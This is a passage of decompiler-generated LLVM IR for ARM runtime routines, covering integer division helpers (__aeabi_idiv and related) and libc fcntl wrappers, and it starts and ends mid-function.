  uselistorder i32 %v4_11f70, { 1, 0 }
  uselistorder i32 %v1_11f70, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11f68, { 1, 0 }
  uselistorder i32 %v4_11f64, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11f64, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11f54, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11f2c, { 1, 0 }
  uselistorder i32 %v0_11f3c, { 1, 0, 2 }
  uselistorder i32 %v4_11f20, { 1, 0 }
  uselistorder i32 %v1_11f28, { 1, 2, 0 }
  uselistorder i32 %v4_11f14, { 1, 0 }
  uselistorder i32 %v1_11f1c, { 1, 2, 0 }
  uselistorder i32 %v4_11f08, { 1, 0 }
  uselistorder i32 %v1_11f10, { 1, 2, 0 }
  uselistorder i32 %v1_11f34, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11f04, { 1, 0 }
  uselistorder i32 %v1_11f30, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11ef0, { 1, 0 }
  uselistorder i32 %v3_11eec, { 1, 0 }
  uselistorder i32 %v1_11eec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11ef0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11edc, { 1, 0 }
  uselistorder i32 %v4_11ed8, { 2, 1, 0 }
  uselistorder i32 %v1_11edc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11ee4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_11eb0, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_11eb0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_11ea4, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11f3c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11ef8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ee4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11fa4 = udiv i32 %arg1, %arg2
  ret i32 %v2_11fa4
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_11fb8 = load i32, i32* @r1, align 4
  %v1_11fb8 = icmp slt i32 %v0_11fb8, 0
  %v2_11fb8 = icmp eq i32 %v0_11fb8, 0
  %v2_11fbc = xor i32 %v0_11fb8, %arg1
  br i1 %v2_11fb8, label %dec_label_pc_120d0, label %dec_label_pc_11fc4

dec_label_pc_11fc4:                               ; preds = %entry
  br i1 %v1_11fb8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_11fc4
  %v2_11fc4 = sub i32 0, %v0_11fb8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11fc4, %bb
  %v1_12090 = phi i32 [ %v2_11fc4, %bb ], [ %v0_11fb8, %dec_label_pc_11fc4 ]
  %v1_11fc8 = add i32 %v1_12090, -1
  %v7_11fc8 = icmp eq i32 %v1_12090, 1
  br i1 %v7_11fc8, label %dec_label_pc_12070, label %dec_label_pc_11fd0

dec_label_pc_11fd0:                               ; preds = %thread-pre-split
  %v1_11fd0 = icmp slt i32 %arg1, 0
  br i1 %v1_11fd0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_11fd0
  %v2_11fd4 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_11fd0, %bb85
  %v0_120c4 = phi i32 [ %arg1, %dec_label_pc_11fd0 ], [ %v2_11fd4, %bb85 ]
  %v3_11fd8 = icmp uge i32 %v0_120c4, %v1_12090
  %v9_11fd8 = icmp eq i32 %v0_120c4, %v1_12090
  %v2_11fdc = xor i1 %v3_11fd8, true
  %v3_11fdc = or i1 %v9_11fd8, %v2_11fdc
  br i1 %v3_11fdc, label %dec_label_pc_1207c, label %dec_label_pc_11fe0

dec_label_pc_11fe0:                               ; preds = %bb86
  %v2_11fe0 = and i32 %v1_11fc8, %v1_12090
  %v4_11fe0 = icmp eq i32 %v2_11fe0, 0
  br i1 %v4_11fe0, label %dec_label_pc_1208c, label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %dec_label_pc_11fe0
  %v3_11fe8 = icmp ult i32 %v1_12090, 536870912
  br i1 %v3_11fe8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11fe8
  %v4_11fec = mul i32 %v1_12090, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11fe8, %.thread
  %v0_1200c.pr40.ph = phi i32 [ %v4_11fec, %.thread ], [ %v1_12090, %dec_label_pc_11fe8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11fe8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1200c.pr40 = phi i32 [ %v4_12000, %bb89 ], [ %v0_1200c.pr40.ph, %.preheader.preheader ]
  %v1_12004 = phi i32 [ %v4_12004, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_11ff8 = icmp ugt i32 %v0_1200c.pr40, 268435455
  br i1 %v2_11ff8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1200cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_11ffc = icmp ult i32 %v0_1200c.pr40, %v0_120c4
  br i1 %v4_11ffc, label %bb88, label %dec_label_pc_1200cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_12000 = and i32 %v0_1200c.pr40, 268435456
  %v3_12000 = icmp eq i32 %v2_12000, 0
  %v4_12000 = mul i32 %v0_1200c.pr40, 16
  br i1 %v3_12000, label %bb89, label %dec_label_pc_1200c.loopexit

bb89:                                             ; preds = %bb88
  %v2_12004 = and i32 %v1_12004, 268435456
  %v3_12004 = icmp eq i32 %v2_12004, 0
  %v4_12004 = mul i32 %v1_12004, 16
  br i1 %v3_12004, label %.preheader, label %dec_label_pc_1200cthread-pre-split.loopexit.loopexit

dec_label_pc_1200cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1201852.ph = phi i32 [ %v1_12004, %bb87 ], [ %v4_12004, %bb89 ]
  %v0_1200c.pr42.ph = phi i32 [ %v0_1200c.pr40, %bb87 ], [ %v4_12000, %bb89 ]
  br label %dec_label_pc_1200cthread-pre-split.loopexit

dec_label_pc_1200cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1200cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1201852 = phi i32 [ %v1_12004, %.thread3 ], [ %v1_1201852.ph, %dec_label_pc_1200cthread-pre-split.loopexit.loopexit ]
  %v0_1200c.pr42 = phi i32 [ %v0_1200c.pr40, %.thread3 ], [ %v0_1200c.pr42.ph, %dec_label_pc_1200cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1200cthread-pre-split

dec_label_pc_1200cthread-pre-split:               ; preds = %dec_label_pc_1200cthread-pre-split.loopexit, %bb91
  %v1_1201850 = phi i32 [ %v1_1201852, %dec_label_pc_1200cthread-pre-split.loopexit ], [ %v3_12018, %bb91 ]
  %v2_1201048 = phi i32 [ %v0_120c4, %dec_label_pc_1200cthread-pre-split.loopexit ], [ %v2_12010, %bb91 ]
  %v0_1200c.pr = phi i32 [ %v0_1200c.pr42, %dec_label_pc_1200cthread-pre-split.loopexit ], [ %v3_12014, %bb91 ]
  br label %dec_label_pc_1200c

dec_label_pc_1200c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1200c

dec_label_pc_1200c:                               ; preds = %dec_label_pc_1200c.loopexit, %dec_label_pc_1200cthread-pre-split
  %v1_12018 = phi i32 [ %v1_1201850, %dec_label_pc_1200cthread-pre-split ], [ %v1_12004, %dec_label_pc_1200c.loopexit ]
  %v2_12010 = phi i32 [ %v2_1201048, %dec_label_pc_1200cthread-pre-split ], [ %v0_120c4, %dec_label_pc_1200c.loopexit ]
  %v1_12014 = phi i32 [ %v0_1200c.pr, %dec_label_pc_1200cthread-pre-split ], [ %v4_12000, %dec_label_pc_1200c.loopexit ]
  %v2_1200c = icmp slt i32 %v1_12014, 0
  br i1 %v2_1200c, label %dec_label_pc_12020, label %bb90

bb90:                                             ; preds = %dec_label_pc_1200c
  %v4_12010 = icmp ult i32 %v1_12014, %v2_12010
  br i1 %v4_12010, label %bb91, label %dec_label_pc_12020

bb91:                                             ; preds = %bb90
  %v3_12014 = mul i32 %v1_12014, 2
  %v2_12018 = icmp slt i32 %v1_12018, 0
  %v3_12018 = mul i32 %v1_12018, 2
  br i1 %v2_12018, label %dec_label_pc_12020, label %dec_label_pc_1200cthread-pre-split

dec_label_pc_12020:                               ; preds = %bb90, %dec_label_pc_1200c, %bb91
  %v2_1202c63 = phi i32 [ %v3_12018, %bb91 ], [ %v1_12018, %bb90 ], [ %v1_12018, %dec_label_pc_1200c ]
  %v1_1202455 = phi i32 [ %v3_12014, %bb91 ], [ %v1_12014, %bb90 ], [ %v1_12014, %dec_label_pc_1200c ]
  br label %dec_label_pc_12024

dec_label_pc_12024:                               ; preds = %.thread13, %dec_label_pc_12020
  %v1_12058 = phi i32 [ %v4_12058, %.thread13 ], [ %v2_1202c63, %dec_label_pc_12020 ]
  %v1_1202c = phi i32 [ %v1_12068, %.thread13 ], [ 0, %dec_label_pc_12020 ]
  %v1_1205c = phi i32 [ %v4_1205c, %.thread13 ], [ %v1_1202455, %dec_label_pc_12020 ]
  %v1_12028 = phi i32 [ %v0_12054, %.thread13 ], [ %v0_120c4, %dec_label_pc_12020 ]
  %v3_12024 = icmp ult i32 %v1_12028, %v1_1205c
  br i1 %v3_12024, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_12024
  %v3_12028 = sub i32 %v1_12028, %v1_1205c
  %v3_1202c = or i32 %v1_1202c, %v1_12058
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12024, %bb92
  %v1_12034 = phi i32 [ %v1_12028, %dec_label_pc_12024 ], [ %v3_12028, %bb92 ]
  %v1_12038 = phi i32 [ %v1_1202c, %dec_label_pc_12024 ], [ %v3_1202c, %bb92 ]
  %v4_12030 = udiv i32 %v1_1205c, 2
  %v6_12030 = icmp ult i32 %v1_12034, %v4_12030
  br i1 %v6_12030, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_12034 = urem i32 %v1_1205c, 2
  %v4_12034 = icmp eq i32 %v3_12034, 0
  %v6_12034 = sub i32 %v1_12034, %v4_12030
  br i1 %v4_12034, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_12038 = udiv i32 %v1_12058, 2
  %v6_12038 = or i32 %v1_12038, %v5_12038
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_12040 = phi i32 [ %v6_12034, %bb93 ], [ %v1_12034, %.thread8 ], [ %v6_12034, %bb94 ]
  %v1_12044 = phi i32 [ %v1_12038, %bb93 ], [ %v1_12038, %.thread8 ], [ %v6_12038, %bb94 ]
  %v4_1203c = udiv i32 %v1_1205c, 4
  %v6_1203c = icmp ult i32 %v1_12040, %v4_1203c
  br i1 %v6_1203c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_12040 = and i32 %v1_1205c, 2
  %v4_12040 = icmp eq i32 %v3_12040, 0
  %v6_12040 = sub i32 %v1_12040, %v4_1203c
  br i1 %v4_12040, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_12044 = udiv i32 %v1_12058, 4
  %v6_12044 = or i32 %v1_12044, %v5_12044
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1204c = phi i32 [ %v6_12040, %bb95 ], [ %v1_12040, %.thread9 ], [ %v6_12040, %bb96 ]
  %v1_12050 = phi i32 [ %v1_12044, %bb95 ], [ %v1_12044, %.thread9 ], [ %v6_12044, %bb96 ]
  %v4_12048 = udiv i32 %v1_1205c, 8
  %v6_12048 = icmp ult i32 %v1_1204c, %v4_12048
  br i1 %v6_12048, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1204c = and i32 %v1_1205c, 4
  %v4_1204c = icmp eq i32 %v3_1204c, 0
  %v6_1204c = sub i32 %v1_1204c, %v4_12048
  br i1 %v4_1204c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_12050 = udiv i32 %v1_12058, 8
  %v6_12050 = or i32 %v1_12050, %v5_12050
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_12068 = phi i32 [ %v1_12050, %bb97 ], [ %v1_12050, %.thread10 ], [ %v6_12050, %bb98 ]
  %v0_12054 = phi i32 [ %v6_1204c, %bb97 ], [ %v1_1204c, %.thread10 ], [ %v6_1204c, %bb98 ]
  %v2_12054 = icmp eq i32 %v0_12054, 0
  br i1 %v2_12054, label %dec_label_pc_12064, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12058, 16
  br i1 %tmp, label %dec_label_pc_12064, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_12058 = udiv i32 %v1_12058, 16
  %v4_1205c = udiv i32 %v1_1205c, 16
  br label %dec_label_pc_12024

dec_label_pc_12064:                               ; preds = %thread-pre-split12, %bb99
  %v1_12064 = icmp slt i32 %v2_11fbc, 0
  br i1 %v1_12064, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12064
  %v2_12068 = sub i32 0, %v1_12068
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_12070, %dec_label_pc_12064, %bb100
  %v1_1206c = phi i32 [ %v1_12068, %dec_label_pc_12064 ], [ %v2_12068, %bb100 ], [ %arg1, %dec_label_pc_12070 ], [ %v2_12074, %bb101 ], [ %v1_1208880, %bb103 ], [ %v2_12084, %bb104 ]
  ret i32 %v1_1206c

dec_label_pc_12070:                               ; preds = %thread-pre-split
  br i1 %v1_11fb8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_12070
  %v2_12074 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1207c:                               ; preds = %bb86
  br i1 %v3_11fd8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1207c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1207c, %bb102
  %v1_1208880 = phi i32 [ %arg1, %dec_label_pc_1207c ], [ 0, %bb102 ]
  br i1 %v9_11fd8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_12080 = ashr i32 %v2_11fbc, 31
  %v2_12084 = or i32 %v4_12080, 1
  br label %.thread16

dec_label_pc_1208c:                               ; preds = %dec_label_pc_11fe0
  %v2_1208c = icmp ugt i32 %v1_12090, 65535
  br i1 %v2_1208c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1208c
  %v2_12090 = and i32 %v1_12090, 32768
  %v3_12090 = icmp eq i32 %v2_12090, 0
  %v4_12090 = udiv i32 %v1_12090, 65536
  br i1 %v3_12090, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1208c
  %v0_1209c70 = phi i32 [ %v1_12090, %dec_label_pc_1208c ], [ %v4_12090, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_120a0 = phi i32 [ %v0_1209c70, %.thread19 ], [ %v4_12090, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1209c = icmp ugt i32 %v1_120a0, 255
  br i1 %v2_1209c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_120a0 = and i32 %v1_120a0, 128
  %v3_120a0 = icmp eq i32 %v2_120a0, 0
  %v4_120a0 = udiv i32 %v1_120a0, 256
  br i1 %v3_120a0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_120a4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_120b0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_120a4, %bb108 ]
  %v1_120ac = phi i32 [ %v1_120a0, %bb106 ], [ %v4_120a0, %bb107 ], [ %v4_120a0, %bb108 ]
  %v2_120a8 = icmp ugt i32 %v1_120ac, 15
  br i1 %v2_120a8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_120ac = and i32 %v1_120ac, 8
  %v3_120ac = icmp eq i32 %v2_120ac, 0
  %v4_120ac = udiv i32 %v1_120ac, 16
  br i1 %v3_120ac, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_120b0 = add nsw i32 %v1_120b0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_120b8 = phi i32 [ %v1_120b0, %.thread20 ], [ %v1_120b0, %bb109 ], [ %v2_120b0, %bb110 ]
  %v5_120bc = phi i32 [ %v1_120ac, %.thread20 ], [ %v4_120ac, %bb109 ], [ %v4_120ac, %bb110 ]
  %v2_120b4 = icmp ugt i32 %v5_120bc, 3
  %v7_120b4 = icmp eq i32 %v5_120bc, 4
  %v2_120b8 = xor i1 %v7_120b4, true
  %v3_120b8 = and i1 %v2_120b4, %v2_120b8
  br i1 %v3_120b8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_120b8 = add nsw i32 %v4_120b8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_120bc = phi i32 [ %v4_120b8, %.thread21 ], [ %v5_120b8, %bb111 ]
  %v2_120bc = xor i1 %v2_120b4, true
  %v3_120bc = or i1 %v7_120b4, %v2_120bc
  br i1 %v3_120bc, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_120bc = udiv i32 %v5_120bc, 2
  %v9_120bc = add i32 %v4_120bc, %v8_120bc
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_120c4 = phi i32 [ %v4_120bc, %bb112 ], [ %v9_120bc, %bb113 ]
  %v1_120c0 = icmp slt i32 %v2_11fbc, 0
  %v6_120c4 = lshr i32 %v0_120c4, %v1_120c4
  %v2_120c8 = sub i32 0, %v6_120c4
  %v2_120c8.v6_120c4 = select i1 %v1_120c0, i32 %v2_120c8, i32 %v6_120c4
  ret i32 %v2_120c8.v6_120c4

dec_label_pc_120d0:                               ; preds = %entry
  %v0_120d4 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_120bc, { 1, 0 }
  uselistorder i1 %v7_120b4, { 1, 0 }
  uselistorder i32 %v4_120ac, { 1, 0 }
  uselistorder i32 %v1_120ac, { 1, 0, 2, 3 }
  uselistorder i32 %v4_120a0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_120a0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12090, { 1, 0 }
  uselistorder i32 %v0_12054, { 1, 0 }
  uselistorder i32 %v4_12048, { 1, 0 }
  uselistorder i32 %v1_12050, { 1, 2, 0 }
  uselistorder i32 %v4_1203c, { 1, 0 }
  uselistorder i32 %v1_12044, { 1, 2, 0 }
  uselistorder i32 %v4_12030, { 1, 0 }
  uselistorder i32 %v1_12038, { 1, 2, 0 }
  uselistorder i32 %v1_1205c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1202c, { 1, 0 }
  uselistorder i32 %v1_12058, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12018, { 1, 0 }
  uselistorder i32 %v3_12014, { 1, 0 }
  uselistorder i32 %v1_12014, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12010, { 1, 0 }
  uselistorder i32 %v1_12018, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12004, { 1, 0 }
  uselistorder i32 %v4_12000, { 2, 1, 0 }
  uselistorder i32 %v1_12004, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1200c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_11fd8, { 1, 0 }
  uselistorder i32 %v1_12090, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_11fbc, { 1, 0, 2 }
  uselistorder i32 %v0_11fb8, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 65535, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12064, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12020, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1200cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_120e8 = sdiv i32 %arg1, %arg2
  ret i32 %v2_120e8
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_12104 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_12104
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_12120 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12120, 2
  br i1 %tmp, label %dec_label_pc_1215c, label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_12190, label %dec_label_pc_1214c

dec_label_pc_1214c:                               ; preds = %dec_label_pc_12138
  %v0_12150 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12184

dec_label_pc_1215c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_12178, label %dec_label_pc_12190

dec_label_pc_12178:                               ; preds = %dec_label_pc_1215c
  %v0_1217c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12184

dec_label_pc_12184:                               ; preds = %dec_label_pc_1214c, %dec_label_pc_12178
  %storemerge2 = phi i32 [ %v0_12150, %dec_label_pc_1214c ], [ %v0_1217c, %dec_label_pc_12178 ]
  %storemerge.in = load i16, i16* @global_var_23424.488, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_12184 = load i32, i32* %r2.global-to-local, align 4
  %v1_12184 = sub i32 0, %v0_12184
  store i32 %v1_12184, i32* %r2.global-to-local, align 4
  %v3_12188 = add i32 %storemerge, %storemerge2
  %v4_12188 = inttoptr i32 %v3_12188 to i32*
  store i32 %v1_12184, i32* %v4_12188, align 4
  br label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %dec_label_pc_12138, %dec_label_pc_1215c, %dec_label_pc_12184
  %storemerge1 = phi i32 [ -1, %dec_label_pc_12184 ], [ %arg1, %dec_label_pc_1215c ], [ %arg1, %dec_label_pc_12138 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12190, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12184, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_121a8 = load i32, i32* @r2, align 4
  %v9_121a8 = load i32, i32* @r3, align 4
  store i32 %v9_121a8, i32* %stack_var_-4, align 4
  %v3_121ac = load i32, i32* @r4, align 4
  store i32 %v3_121ac, i32* %stack_var_-32, align 4
  %v6_121ac = load i32, i32* @r5, align 4
  %v12_121ac = load i32, i32* @r7, align 4
  %v4_121bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_121c4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_121c4, i32* @r3, align 4
  %v2_121c8 = icmp eq i32 %v4_121bc, 0
  %v0_121d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_121d0, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_121a8, i32* @r4, align 4
  br i1 %v2_121c8, label %dec_label_pc_121ec, label %dec_label_pc_121e0

dec_label_pc_121e0:                               ; preds = %entry
  %v7_121e0 = icmp eq i32 %arg2, 7
  br i1 %v7_121e0, label %dec_label_pc_1222c, label %bb

bb:                                               ; preds = %dec_label_pc_121e0
  %v8_121e4 = icmp eq i32 %arg2, 14
  br i1 %v8_121e4, label %dec_label_pc_1222c, label %dec_label_pc_121ec

dec_label_pc_121ec:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_121d0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_121d0, -4095
  br i1 %tmp, label %dec_label_pc_12224, label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121ec
  %v0_12210 = call i32 @__aeabi_read_tp()
  %v3_12214 = load i16, i16* @global_var_23424.488, align 2
  %v4_12214 = sext i16 %v3_12214 to i32
  store i32 %v4_12214, i32* @r3, align 4
  %v0_12218 = load i32, i32* @r2, align 4
  %v1_12218 = sub i32 0, %v0_12218
  store i32 %v1_12218, i32* @r2, align 4
  %v3_1221c = add i32 %v4_12214, %v0_12210
  %v4_1221c = inttoptr i32 %v3_1221c to i32*
  store i32 %v1_12218, i32* %v4_1221c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12224

dec_label_pc_12224:                               ; preds = %dec_label_pc_121ec, %dec_label_pc_1220c
  %v0_12224 = phi i32 [ %v0_121d0, %dec_label_pc_121ec ], [ -1, %dec_label_pc_1220c ]
  br label %dec_label_pc_12278

dec_label_pc_1222c:                               ; preds = %dec_label_pc_121e0, %bb
  %v0_1222c = call i32 @__libc_enable_asynccancel()
  %v0_12230 = load i32, i32* @r7, align 4
  store i32 %v0_12230, i32* @r1, align 4
  store i32 %v0_1222c, i32* %r6.global-to-local, align 4
  %v0_1223c = load i32, i32* @r5, align 4
  store i32 %v0_1223c, i32* %r0.global-to-local, align 4
  store i32 %v0_1223c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_1223c, -4095
  br i1 %tmp15, label %dec_label_pc_1226c, label %dec_label_pc_12254

dec_label_pc_12254:                               ; preds = %dec_label_pc_1222c
  %v1_12258 = sub i32 0, %v0_1223c
  %v0_1225c = call i32 @__aeabi_read_tp()
  store i32 %v0_1225c, i32* %r0.global-to-local, align 4
  %v3_12260 = load i16, i16* @global_var_23424.488, align 2
  %v4_12260 = sext i16 %v3_12260 to i32
  store i32 %v4_12260, i32* @r3, align 4
  %v3_12264 = add i32 %v4_12260, %v0_1225c
  %v4_12264 = inttoptr i32 %v3_12264 to i32*
  store i32 %v1_12258, i32* %v4_12264, align 4
  store i32 -1, i32* @r2, align 4
  %v0_1226c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1226c

dec_label_pc_1226c:                               ; preds = %dec_label_pc_1222c, %dec_label_pc_12254
  %v0_12270 = phi i32 [ %v0_1223c, %dec_label_pc_1222c ], [ -1, %dec_label_pc_12254 ]
  %v0_1226c = phi i32 [ %v0_1222c, %dec_label_pc_1222c ], [ %v0_1226c.pre, %dec_label_pc_12254 ]
  store i32 %v0_1226c, i32* %r0.global-to-local, align 4
  store i32 %v0_12270, i32* @r7, align 4
  %v1_12274 = call i32 @__libc_disable_asynccancel(i32 %v0_1226c)
  store i32 %v1_12274, i32* %r0.global-to-local, align 4
  %v0_12278.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12278

